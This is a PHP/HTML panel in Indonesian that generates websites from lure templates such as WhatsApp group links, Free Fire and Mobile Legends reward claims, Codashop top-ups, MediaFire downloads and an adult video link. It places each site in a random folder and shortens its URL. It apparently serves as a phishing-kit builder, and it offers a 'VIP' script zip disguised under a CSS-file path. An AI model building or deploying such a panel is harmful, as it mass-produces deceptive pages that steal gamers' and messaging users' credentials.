<?php
include 'AlexShortLink.php';
function generateRandomSubdomain($length = 8) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$subdomain = generateRandomSubdomain();
$domain = $_SERVER['SERVER_NAME'];
$longURL = $domain . '/' . $subdomain;
$shortenedURL = shortenURL($longURL);
?>



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <title>Buat Otomatis | Script By Luky Nesia</title>
  <style>
    @font-face {
      font-family: 'ibm';
      src: url('https://saweria.co/ibm-plex-mono-latin-400.woff');
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'ibm';
    }
    html, body {
      height: 100%;
    }
    body {
      background: #E2E8F0;
      display: flex;
      flex-direction: column;
      padding: 10px;
    }
    .gateway {
      max-width: 600px;
      width: 100%;
      background: white;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      display: flex;
      flex-direction: column;
      align-items: center;
      flex: 1;
      margin: auto;
    }
    .source {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      background: #25D366;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
      cursor: pointer;
    }
    .form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }
    .form label {
      display: flex;
      flex-direction: column;
    }
    label select, label input {
      height: 35px;
      border: 1px solid #000;
      border-radius: 5px;
      padding: 5px 10px;
      background: #A0AEC0;
      font-size: 14px;
      box-shadow: 0.2rem 0.2rem 0 #222;
    }
    .form button {
      margin-top: 10px;
      padding: 8px 15px;
      background: #faae2b;
      border: 1px solid #000;
      border-radius: 5px;
      font-weight: bold;
      box-shadow: 0.2rem 0.2rem 0 #222;
    }
    .form button:hover {
      background: #ffca4b;
      cursor: pointer;
    }
    .hidden {
      display: none;
    }
    .preview-img-container {
      text-align: center;
      margin-top: 15px;
    }
    .preview-img {
      max-width: 100%;
      border: 2px solid #333;
      border-radius: 10px;
      box-shadow: 2px 2px 10px rgba(0,0,0,0.2);
    }
    footer {
      text-align: center;
      padding: 15px 0;
      font-size: 14px;
      background: transparent;
    }
    footer a {
      margin-left: 5px;
      text-decoration: none;
      color: #2D3748;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="gateway">
    <div onclick="Source()" class="source">Download Script Webp Vip</div>

    <div class="form">
      <label for="list"> TAMPILAN
        <select id="list">
        <option selected disabled>Pilih terlebih dahulu...</option>
        <option value="tamp1">Link WhatsApp</option>
        <option value="tamp2">Link Videy 18+</option>
        <option value="tamp3">Link MediaFire Alex</option>       
        <option value="tamp4">Link Join WA</option>
        <option value="tamp5">Link Join WA</option>
        <option value="tamp6">Link Mobile Legends</option>
        <option value="tamp7">Link FF Claim V1</option>
        <option value="tamp8">Link Sfilemobi</option>
        <option value="tamp9">Link Ff Tuker Koin</option>
        <option value="tamp10">Link Codashop FF</option>
        <option value="tamp11">Link Codashop ML</option>
        <option value="tamp12">Link Free Fire X Naruto</option>
        <option value="tamp13">Link MediaFire ZIP</option>
        <option value="tamp14">Harap Tidak Spam Link</option>
      </select>
    </label>

      <label> NAMA FOLDER
        <input id="subdo-main" name="subdo" type="text" readonly value="<?= $subdomain ?>">
      </label>

      <div class="hidden" id="tamp1">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="1">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-1" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp2">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="2">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-2" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp3">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="3">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-3" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp4">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="4">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-4" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp5">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="5">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-5" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp6">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="6">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-6" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp7">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="7">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-7" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp8">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="8">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-8" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp9">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="9">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-9" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp10">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="10">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-10" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp11">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="11">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-11" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp12">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="12">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-12" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp13">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="13">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-13" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp14">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="14">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-14" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div><div class="hidden" id="tamp15">
            <form method="post" action="proses.php">
              <input type="hidden" name="nomor" value="15">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-15" src="" alt="Preview" style="display:none;">
              </div>
            </form>
          </div>    </div>
  </div>

  <footer>
    Pembuat SC <a href="https://wa.me/6289509551861">LUKY NESIA KLIK DI SINI</a>
  </footer>

  <script>
    function Source() {
      window.location = 'https://cdn.jsdelivr.net/gh/unpkgcom/assets@main/libs/style/main.css/script2login.zip';
    }

    const previewImages = {
    tamp1: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/1.jpg',
    tamp2: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/2.jpg',
    tamp3: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/IMG_20250511_234806.jpg',
    tamp4: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/4.jpg',
    tamp5: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/5.jpg',
    tamp6: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/6.jpg',
    tamp7: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/7.jpg',
    tamp8: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/8.jpg',
    tamp9: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/9.jpg',
    tamp10: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/10.jpg',
    tamp11: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/14.jpg',
    tamp12: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/12.jpg',
    tamp13: 'https://cdn.jsdelivr.net/gh/Lukyhosting/lukynesianihbos@main/libs/assets/img/13.jpg',
    };

    function generateRandomSubdomain(length = 30) {
      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    }

    function showElement(id) {
      document.querySelectorAll('.hidden').forEach(el => el.style.display = 'none');
      document.getElementById(id).style.display = 'block';
    }

    document.getElementById('list').addEventListener('change', function () {
      const selected = this.value;
      const newSub = generateRandomSubdomain();

      document.getElementById('subdo-main').value = newSub;
      document.querySelectorAll('.subdo-input').forEach(input => input.value = newSub);

      showElement(selected);

      const img = document.querySelector(`#${selected} .preview-img`);
      if (previewImages[selected]) {
        img.src = previewImages[selected];
        img.style.display = 'block';
      } else {
        img.style.display = 'none';
      }
    });
  </script>
</body>
</html>